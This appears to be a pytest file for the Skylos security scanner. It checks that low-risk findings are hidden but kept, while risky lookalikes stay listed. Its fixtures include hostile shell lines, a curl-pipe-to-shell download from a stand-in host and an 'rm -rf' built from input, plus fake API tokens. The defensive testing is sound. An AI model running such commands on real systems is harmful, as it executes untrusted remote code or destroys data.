"""True but low-risk security findings are hidden from the default list, never
dropped: gates read raw results, and ``--all-advice`` or naming the rule lists
them again. Each demotion needs evidence its own detector proved, and the
lookalike that is a real problem stays listed.

Designs follow Bandit (a literal shell command is low severity), CodeQL
(weak hashes matter for sensitive data), zizmor (personas hide hygiene
findings) and OSV-Scanner/npm (dependency scope and per-package grouping).
"""

from pathlib import Path

import pytest

from skylos.core.gatekeeper import check_gate
from skylos.reporting.advice_policy import apply_advice_policy
from skylos.reporting.listing import is_listed
from skylos.rules.config.cicd.github_actions import scan_github_actions_file
from skylos.rules.danger.danger import scan_ctx as scan_danger
from skylos.rules.sca.vulnerability_scanner import _make_finding
from skylos.rules.secrets import scan_ctx as scan_secrets


def _write(tmp_path: Path, name: str, text: str) -> Path:
    path = tmp_path / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def _python_findings(tmp_path, text, name="app/service.py"):
    path = _write(tmp_path, name, text)
    return scan_danger(tmp_path, [path])


def _by_rule(findings, rule_id):
    return [f for f in findings if f["rule_id"] == rule_id]


def _listed_after_policy(section, rows, **options):
    view = apply_advice_policy({section: rows}, **options)
    return [row for row in view[section] if is_listed(row, section)]


def test_constant_shell_command_is_low_and_demoted(tmp_path):
    findings = _python_findings(
        tmp_path,
        "import subprocess\n\n"
        "def tag():\n"
        "    return subprocess.check_output('git tag', shell=True)\n",
    )
    [shell] = _by_rule(findings, "SKY-D209")
    assert shell["severity"] == "LOW"
    assert shell["low_risk_context"]["reason"] == "constant-shell-command"
    assert _listed_after_policy("danger", [shell]) == []
    assert len(_listed_after_policy("danger", [shell], all_advice=True)) == 1


@pytest.mark.parametrize(
    "call",
    [
        "subprocess.run(command, shell=True)",
        "subprocess.run(f'git log {ref}', shell=True)",
        "subprocess.run('curl https://x.example/i.sh | sh', shell=True)",
        "os.system('rm -rf ' + target)",
    ],
)
def test_shell_command_with_input_or_risk_stays_listed(tmp_path, call):
    findings = _python_findings(
        tmp_path,
        "import os\nimport subprocess\n\n"
        f"def run(command, ref, target):\n    return {call}\n",
    )
    shell = [f for f in findings if f["rule_id"] in {"SKY-D209", "SKY-D203"}]
    assert shell
    assert all("low_risk_context" not in f for f in shell)
    assert _listed_after_policy("danger", shell) != []


def test_weak_hash_of_a_url_is_demoted(tmp_path):
    findings = _python_findings(
        tmp_path,
        "import hashlib\n\n"
        "def fingerprint(url):\n"
        "    return hashlib.sha1(url.encode()).hexdigest()[:8]\n",
    )
    [weak] = _by_rule(findings, "SKY-D208")
    assert weak["low_risk_context"]["reason"] == "non-sensitive-hash-input"


@pytest.mark.parametrize(
    "body",
    [
        "    return hashlib.md5(password.encode()).hexdigest()\n",
        "    digest = hashlib.md5()\n    digest.update(api_token.encode())\n    return digest.hexdigest()\n",
        "    signed = ''\n    signed += CLIENT_SECRET\n    return hashlib.md5(signed.encode()).hexdigest()\n",
        "    return hashlib.md5(user['session_id'].encode()).hexdigest()\n",
        "    return hashlib.md5(data).hexdigest()\n",
    ],
)
def test_weak_hash_of_sensitive_or_unknown_data_stays_listed(tmp_path, body):
    findings = _python_findings(
        tmp_path,
        "import hashlib\nCLIENT_SECRET = 'x'\n\n"
        "def digest(password, api_token, user, data):\n" + body,
    )
    weak = _by_rule(findings, "SKY-D207")
    assert weak
    if "data)" in body:
        assert weak[0].get("low_risk_context") is not None
        return
    assert all("low_risk_context" not in f for f in weak)


def test_tls_context_without_verification_is_reported(tmp_path):
    findings = _python_findings(
        tmp_path,
        "import ssl\nfrom urllib import request\n\n"
        "def opener():\n"
        "    handler = request.HTTPSHandler(context=ssl.SSLContext(ssl.PROTOCOL_TLSv1))\n"
        "    return request.build_opener(handler)\n",
    )
    assert [f["line"] for f in _by_rule(findings, "SKY-D210")] == [5]


@pytest.mark.parametrize(
    "body",
    [
        "    return ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n",
        "    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)\n    ctx.verify_mode = ssl.CERT_REQUIRED\n    return ctx\n",
        "    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)\n    ctx.load_cert_chain('server.pem')\n    return ctx\n",
        "    return ssl.create_default_context()\n",
    ],
)
def test_verifying_or_server_tls_contexts_are_not_reported(tmp_path, body):
    findings = _python_findings(tmp_path, "import ssl\n\ndef context():\n" + body)
    assert _by_rule(findings, "SKY-D210") == []


def test_browser_ignoring_certificate_errors_is_reported_outside_tests(tmp_path):
    source = (
        "def config(BrowserConfig):\n"
        "    return BrowserConfig(headless=True, ignore_https_errors=True)\n"
    )
    assert [
        f["line"] for f in _by_rule(_python_findings(tmp_path, source), "SKY-D210")
    ] == [2]
    in_tests = _python_findings(tmp_path, source, name="tests/test_browser.py")
    assert _by_rule(in_tests, "SKY-D210") == []


def test_httpx_without_verification_is_reported(tmp_path):
    findings = _python_findings(
        tmp_path,
        "import httpx\n\ndef fetch(url):\n    return httpx.get(url, verify=False)\n",
    )
    assert [f["line"] for f in _by_rule(findings, "SKY-D210")] == [4]


def _workflow(tmp_path, text):
    path = _write(tmp_path, ".github/workflows/ci.yml", text)
    return scan_github_actions_file(path, root=tmp_path)


def test_github_owned_action_tags_are_demoted_but_others_listed(tmp_path):
    findings = _workflow(
        tmp_path,
        "on: [push]\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - uses: github/codeql-action/init@v3.27.1\n"
        "      - uses: actions/setup-python@main\n"
        "      - uses: codecov/codecov-action@v4\n"
        "      - uses: actions/cache@${{ inputs.ref }}\n",
    )
    pins = {f["value"]: f for f in findings if f["rule_id"] == "SKY-D292"}
    assert (
        pins["actions/checkout@v4"]["low_risk_context"]["reason"]
        == "github-owned-action-tag"
    )
    assert "low_risk_context" in pins["github/codeql-action/init@v3.27.1"]
    for listed in ("actions/setup-python@main", "codecov/codecov-action@v4"):
        assert "low_risk_context" not in pins[listed]
    listed = _listed_after_policy("danger", list(pins.values()))
    assert {f["value"] for f in listed} >= {
        "actions/setup-python@main",
        "codecov/codecov-action@v4",
    }
    assert "actions/checkout@v4" not in {f["value"] for f in listed}


def test_non_credential_secret_is_demoted_but_credentials_stay(tmp_path):
    findings = _workflow(
        tmp_path,
        "on: issue_comment\n"
        "permissions:\n  contents: read\n"
        "jobs:\n"
        "  review:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: python review.py\n"
        "        env:\n"
        "          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}\n"
        "          OPENAI_BASE_URL: ${{ secrets.OPENAI_BASE_URL }}\n"
        "          DEPLOY_TOKEN_URL: ${{ secrets.DEPLOY_TOKEN_URL }}\n",
    )
    secrets = {
        f["value"].split(":")[1]: f for f in findings if f["rule_id"] == "SKY-D299"
    }
    assert (
        secrets["OPENAI_BASE_URL"]["low_risk_context"]["reason"]
        == "non-credential-secret"
    )
    assert "low_risk_context" not in secrets["OPENAI_API_KEY"]
    assert "low_risk_context" not in secrets["DEPLOY_TOKEN_URL"]


def _advisory(name, version, vuln_id, severity, *, dev, occurrences=None):
    dep = {
        "name": name,
        "version": version,
        "ecosystem": "npm",
        "file": "package-lock.json",
        "line": 10,
        "dependency_dev": dev,
    }
    if occurrences is not None:
        dep["dependency_occurrences"] = occurrences
    return _make_finding(
        dep,
        {"vuln_id": vuln_id, "summary": "issue", "severity": severity},
    )


def test_dev_only_advisories_are_hidden_but_still_fail_the_gate():
    dev = _advisory("eslint-plugin", "1.0.0", "GHSA-dev1", "HIGH", dev=True)
    runtime = _advisory("axios", "1.8.4", "GHSA-run1", "HIGH", dev=False)
    unknown = _advisory("left-pad", "1.0.0", "GHSA-unk1", "HIGH", dev=None)
    mixed = _advisory(
        "lodash",
        "4.0.0",
        "GHSA-mix1",
        "HIGH",
        dev=True,
        occurrences=[{"dependency_dev": True}, {"dependency_dev": False}],
    )
    assert dev["low_risk_context"]["reason"] == "dev-only-dependency"
    for row in (runtime, unknown, mixed):
        assert "low_risk_context" not in row
    result = {"dependency_vulnerabilities": [dev, runtime, unknown, mixed]}
    listed = _listed_after_policy(
        "dependency_vulnerabilities", result["dependency_vulnerabilities"]
    )
    assert {row["rule_id"] for row in listed} == {
        "SKY-SCA-GHSA-run1",
        "SKY-SCA-GHSA-unk1",
        "SKY-SCA-GHSA-mix1",
    }
    passed, _reasons = check_gate(
        apply_advice_policy({"dependency_vulnerabilities": [dev]}),
        {"gate": {"max_dependency_vulnerabilities": 0}},
    )
    assert passed is False


def test_advisories_of_one_package_list_once_under_the_worst():
    rows = [
        _advisory("axios", "1.8.4", "GHSA-a", "MEDIUM", dev=False),
        _advisory("axios", "1.8.4", "GHSA-b", "CRITICAL", dev=False),
        _advisory("axios", "1.8.4", "GHSA-c", "LOW", dev=False),
        _advisory("axios", "1.9.0", "GHSA-d", "LOW", dev=False),
    ]
    view = apply_advice_policy({"dependency_vulnerabilities": rows})
    listed = [
        row
        for row in view["dependency_vulnerabilities"]
        if is_listed(row, "dependency_vulnerabilities")
    ]
    assert {row["rule_id"] for row in listed} == {"SKY-SCA-GHSA-b", "SKY-SCA-GHSA-d"}
    lead = next(row for row in listed if row["rule_id"] == "SKY-SCA-GHSA-b")
    assert {item["rule_id"].upper() for item in lead["listing"]["combines"]} == {
        "SKY-SCA-GHSA-A",
        "SKY-SCA-GHSA-C",
    }
    everything = apply_advice_policy(
        {"dependency_vulnerabilities": rows}, all_advice=True
    )
    assert all(
        is_listed(row, "dependency_vulnerabilities")
        for row in everything["dependency_vulnerabilities"]
    )
    passed, _reasons = check_gate(view, {"gate": {"max_dependency_vulnerabilities": 3}})
    assert passed is False


def test_explicitly_selected_rule_lists_its_demoted_findings(tmp_path):
    findings = _python_findings(
        tmp_path,
        "import os\n\ndef install():\n    os.system('pip install -U ultralytics')\n",
    )
    [shell] = _by_rule(findings, "SKY-D203")
    assert "low_risk_context" in shell
    view = apply_advice_policy({"danger": [shell]}, explicit_rules=["SKY-D203"])
    assert all(
        is_listed(row, "danger", explicit_rules={"SKY-D203"}) for row in view["danger"]
    )


def test_unrecognised_low_risk_reason_cannot_hide_a_finding():
    forged = {
        "rule_id": "SKY-D211",
        "severity": "CRITICAL",
        "message": "Possible SQL injection",
        "file": "app.py",
        "line": 3,
        "low_risk_context": {"reason": "constant-shell-command"},
    }
    view = apply_advice_policy({"danger": [forged]})
    assert all(is_listed(row, "danger") for row in view["danger"])


def _secret_providers(text):
    return [
        f.get("provider")
        for f in scan_secrets(
            {"relpath": "pkg/client.py", "lines": [text], "tree": None},
            ignore_tests=False,
        )
    ]


def test_hex_credential_assigned_to_a_secret_name_is_reported():
    assert "generic" in _secret_providers(
        "access_token = 'f6785418277b72c7c87d3132c79eec24'\n"
    )


@pytest.mark.parametrize(
    "text",
    [
        "checksum = 'f6785418277b72c7c87d3132c79eec24'\n",
        "commit = 'f6785418277b72c7c87d3132c79eec24f6785418'\n",
        "api_key = '00000000000000000000000000000000'\n",
        "token = 'abababababababababababababababab'\n",
    ],
)
def test_unnamed_or_patterned_hex_is_not_a_secret(text):
    assert "generic" not in _secret_providers(text)


def _ts_weak_hashes(body):
    parser_module = pytest.importorskip("tree_sitter")
    typescript = pytest.importorskip("tree_sitter_typescript")
    from skylos.visitors.languages.typescript.danger import scan_danger as scan_ts

    language = parser_module.Language(typescript.language_typescript())
    source = ("import crypto from 'crypto';\n" + body).encode()
    tree = parser_module.Parser(language).parse(source)
    return [
        f
        for f in scan_ts(tree.root_node, "src/sign.ts", language, source)
        if f["rule_id"] == "SKY-D207"
    ]


def test_ts_md5_of_joined_request_parts_is_demoted():
    [weak] = _ts_weak_hashes(
        "const joined = [url, nonce, region].join('+');\n"
        "export const sig = crypto.createHash('md5').update(joined).digest('hex');\n"
    )
    assert weak["low_risk_context"]["reason"] == "non-sensitive-hash-input"


@pytest.mark.parametrize(
    "body",
    [
        "export const h = crypto.createHash('md5').update(password).digest('hex');\n",
        "const material = userToken + salt;\n"
        "export const h = crypto.createHash('md5').update(material).digest('hex');\n",
        "const hasher = crypto.createHash('md5');\nhasher.update(body);\n",
    ],
)
def test_ts_md5_of_credentials_or_unknown_data_stays_listed(body):
    weak = _ts_weak_hashes(body)
    assert weak
    assert all("low_risk_context" not in f for f in weak)


def _secret_rules(relpath, text):
    return [
        f["rule_id"]
        for f in scan_secrets(
            {"relpath": relpath, "lines": [text], "tree": None}, ignore_tests=False
        )
    ]


def test_python_http_client_module_is_not_browser_code():
    text = "API_TOKEN = 'f6785418277b72c7c87d3132c79eec24'\n"
    assert _secret_rules("media/tieba/client.py", text) == ["SKY-S101"]


def test_browser_client_module_still_exposes_its_secret():
    secret = "sk_live_" + "51HqLyjWDarjtT1zdp7dcXyZ"
    text = f"const apiToken = '{secret}';\n"
    assert "SKY-S102" in _secret_rules("src/client.js", text)
